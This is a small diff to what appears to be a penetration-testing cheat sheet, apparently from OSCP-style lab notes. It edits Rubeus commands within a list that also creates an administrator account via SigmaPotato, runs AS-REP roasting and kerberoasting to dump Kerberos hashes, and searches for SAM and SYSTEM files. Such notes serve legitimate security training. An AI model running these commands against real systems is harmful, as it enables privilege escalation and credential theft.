@@ -72,8 +72,8 @@ net group "Domain Admins" /domain
 winPEASx64.exe
 .\SigmaPotato.exe "net user offsec password123 /add"
 .\SigmaPotato.exe "net localgroup administrators offsec /add"
-Rubeus.exe asreproast /nowrap
-Rubeus.exe kerberoast /outfile:hashes.kerberoast
+.\Rubeus.exe asreproast /nowrap
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
 dir /s SAM
 dir /s SYSTEM
 ```
